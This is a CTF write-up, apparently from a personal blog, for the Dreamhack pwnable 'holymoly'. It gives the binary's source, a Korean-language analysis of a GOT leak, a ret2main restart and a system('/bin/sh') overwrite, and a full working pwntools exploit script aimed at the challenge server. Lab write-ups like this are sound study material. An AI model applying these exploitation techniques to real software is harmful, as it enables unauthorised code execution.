---
title: "holymoly writeup"
date: 2026-06-01 00:00:00 +0900
categories: [Wargame, Dreamhack, Pwnable]
tags: [pwn, got-overwrite, ret2main, dreamhack]
---

## Analysis

### checksec

```
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3ff000)
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
```

### Source Code

```c
/* holymoly.c
 * gcc -Wall -no-pie -s holymoly.c -o holymoly
*/

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define HOLYMOLY_ID         0
#define ROLYPOLY_ID         1
#define MONOPOLY_ID         2
#define GUACAMOLE_ID        3
#define ROBOCARPOLI_ID      4
#define HALLIGALLI_ID       5
#define BROCCOLI_ID         6
#define BORDERCOLLIE_ID     7
#define BLUEBERRY_ID        8
#define CRANBERRY_ID        9
#define MYSTERY_ID          10
#define INVALID_ID          11

#define HOLYMOLY        "holymoly"
#define ROLYPOLY        "rolypoly"
#define MONOPOLY        "monopoly"
#define GUACAMOLE       "guacamole"
#define ROBOCARPOLI     "robocarpoli"
#define HALLIGALLI      "halligalli"
#define BROCCOLI        "broccoli"
#define BORDERCOLLIE    "bordercollie"
#define BLUEBERRY       "blueberry"
#define CRANBERRY       "cranberry"
#define MYSTERY         "mystery"

#define SWITCH_VAL      0
#define SWITCH_PTR      1

struct phrase_t {
    uint8_t id;
    char *str;
    size_t len;
};

const struct phrase_t phrases[11] = {
    {.id = HOLYMOLY_ID,      .str = HOLYMOLY,     .len = sizeof(HOLYMOLY)},
    {.id = ROLYPOLY_ID,      .str = ROLYPOLY,     .len = sizeof(ROLYPOLY)},
    {.id = MONOPOLY_ID,      .str = MONOPOLY,     .len = sizeof(MONOPOLY)},
    {.id = GUACAMOLE_ID,     .str = GUACAMOLE,    .len = sizeof(GUACAMOLE)},
    {.id = ROBOCARPOLI_ID,   .str = ROBOCARPOLI,  .len = sizeof(ROBOCARPOLI)},
    {.id = HALLIGALLI_ID,    .str = HALLIGALLI,   .len = sizeof(HALLIGALLI)},
    {.id = BROCCOLI_ID,      .str = BROCCOLI,     .len = sizeof(BROCCOLI)},
    {.id = BORDERCOLLIE_ID,  .str = BORDERCOLLIE, .len = sizeof(BORDERCOLLIE)},
    {.id = BLUEBERRY_ID,     .str = BLUEBERRY,    .len = sizeof(BLUEBERRY)},
    {.id = CRANBERRY_ID,     .str = CRANBERRY,    .len = sizeof(CRANBERRY)},
    {.id = MYSTERY_ID,       .str = MYSTERY,      .len = sizeof(MYSTERY)},
};

int amounts[4] = {0x1000, 0x100, 0x10, 0x1};

uint64_t *ptr;
uint64_t val;
uint8_t ptrval_switch;

void Init();
void Interpret(char *song);
uint8_t Parse(char *song_ptr);
void ProcessPhraseID(uint8_t id);
void Increase(int amount);
void Decrease(int amount);
void Read();
void Write();
void OperateSwitch();

int main(void) {
    char *song;

    Init();
    printf("holymoly? ");
    song = calloc(0xbeef, 1);
    scanf("%48878s", song);
    Interpret(song);
    puts("holymoly!");
}

void Init() {
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);
    setvbuf(stderr, 0, _IONBF, 0);
    ptr = NULL;
    val = 0;
}

void Interpret(char *song) {
    uint8_t id;
    char *song_ptr;

    song_ptr = song;

    while (1) {
        id = Parse(song_ptr);
        if (id >= INVALID_ID)
            return;
        ProcessPhraseID(id);
        song_ptr += phrases[id].len - 1;
    }
}

uint8_t Parse(char *song_ptr) {
    int i;

    for (i = 0; i < sizeof(phrases) / sizeof(phrases[0]); i++)
        if (memcmp(phrases[i].str, song_ptr, phrases[i].len - 1) == 0)
            return phrases[i].id;

    return INVALID_ID;
}

void ProcessPhraseID(uint8_t id) {
    switch (id) {
    case HOLYMOLY_ID ... GUACAMOLE_ID:
        Increase(amounts[id - HOLYMOLY_ID]);
        break;
    case ROBOCARPOLI_ID ... BORDERCOLLIE_ID:
        Decrease(amounts[id - ROBOCARPOLI_ID]);
        break;
    case BLUEBERRY_ID:
        Read();
        break;
    case CRANBERRY_ID:
        Write();
        break;
    case MYSTERY_ID:
        OperateSwitch();
        break;
    }
}

void Increase(int amount) {
    if (ptrval_switch)
        ptr = (uint64_t *)((uint8_t *)ptr + amount);
    else
        val += amount;
}

void Decrease(int amount) {
    if (ptrval_switch)
        ptr = (uint64_t *)((uint8_t *)ptr - amount);
    else
        val -= amount;
}

void Read() {
    write(1, (char *)ptr, 8);
}

void Write() {
    *ptr = val;
}

void OperateSwitch() {
    ptrval_switch = ptrval_switch ? SWITCH_VAL : SWITCH_PTR;
}
```

## Vulnerability Analysis

프로그램을 요약하면, 총 5가지의 연산이 있으며 `0x1`, `0x10`, `0x100`, `0x1000` 단위로 전역 변수 `ptr`과 `val`을 증가시키거나 감소시킬 수 있고, `ptr` 주소에 저장된 값을 출력하거나 `val`의 값을 `ptr` 주소에 쓰거나 증가/감소 연산을 `ptr` 혹은 `val` 둘 중 하나로 스위치하는 연산이 있다.

우선 쉘을 획득하려면 libc base를 leak해야 하는데 No PIE이므로 `ptr`이 GOT entry를 가리키도록 증가시킨 후 출력 연산으로 leak하면 된다. 이후 페이로드를 재전송하기 위해서 `puts@got`를 `main`으로 덮어 ret2main 하면 된다. 두 번째 페이로드 구성 단계에서 처음에는 `puts@got`를 원가젯으로 덮는 시도를 했으나 제약 조건이 맞는 가젯이 없어 실패했다. 그래서 어셈블리 코드를 살펴보다가 `Init` 함수에서 다음 코드를 발견했다.

```
pwndbg> x/50i 0x401267
   0x401267:    endbr64
   0x40126b:    push   rbp
   0x40126c:    mov    rbp,rsp
   0x40126f:    mov    rax,QWORD PTR [rip+0x2e1a]        # 0x404090 <stdin>
   0x401276:    mov    ecx,0x0
   0x40127b:    mov    edx,0x2
   0x401280:    mov    esi,0x0
   0x401285:    mov    rdi,rax
   0x401288:    call   0x4010f0 <setvbuf@plt>
   ...
```

`stdin`의 값을 첫 번째 인자로 하여 `setvbuf`를 호출하는 것을 확인할 수 있다. 따라서, `stdin`을 `/bin/sh`로 덮고 `setvbuf@got`를 `system` 함수 주소로 덮은 후 `Init` 함수를 호출하면 쉘을 획득할 수 있다.

주의할 점으로 `val`의 값을 `binsh`나 `system`으로 만들 때 `ptr`을 1바이트씩 증가시키며 unaligned write를 수행해야 한다. 왜냐하면 한 번에 전송할 수 있는 페이로드의 크기는 `48878`으로 제한되는데 libc 함수의 주소는 `0x7fxxxxxxxxxx`이므로 가장 큰 증가 연산 단위인 `0x1000`으로 만들려면.. 택도 없이 부족하기 때문이다.

## Exploit

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./holymoly")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host3.dreamhack.games", 14999)

    return r

def gen_value_payload(value):
    payload = b""
    for i in range(6):
        target_byte = (value >> (i * 8)) & 0xff
        upper_nibble = (target_byte >> 4) & 0xf
        lower_nibble = target_byte & 0xf

        payload += b"mystery"

        payload += b"monopoly" * upper_nibble
        payload += b"guacamole" * lower_nibble

        payload += b"cranberry"

        payload += b"broccoli" * upper_nibble
        payload += b"bordercollie" * lower_nibble

        payload += b"mystery"
        payload += b"guacamole"
    return payload

def main():
    r = conn()

    # leak got entry of setvbuf
    payload = b"mystery"
    payload += b"holymoly" * 1028
    payload += b"monopoly" * 4
    payload += b"blueberry"         

    # overwrite got entry of puts for ret2main        
    payload += b"broccoli" * 2
    payload += b"bordercollie" * 8
    payload += b"mystery"
    payload += b"holymoly" * 1025
    payload += b"rolypoly"
    payload += b"monopoly" * 15
    payload += b"guacamole" * 6
    payload += b"cranberry"
    payload += b"aaaaaaaa"

    r.sendlineafter(b"holymoly? ", payload)
    setvbuf = u64(r.recvn(8))
    
    libc.address = setvbuf - libc.symbols["setvbuf"]
    binsh = next(libc.search(b"/bin/sh\x00"))
    system = libc.symbols["system"]

    # overwrite stdin with /bin/sh and got entry of setvbuf with system
    payload2 = b"mystery"
    payload2 += b"holymoly" * 1028
    payload2 += b"monopoly" * 9
    payload2 += gen_value_payload(binsh)
    payload2 += b"bordercollie" * 6
    payload2 += b"broccoli" * 5
    payload2 += gen_value_payload(system)
    payload2 += b"aaaaaaaa"

    r.sendlineafter(b"holymoly? ", payload2)
    r.interactive()

if __name__ == "__main__":
    main()
```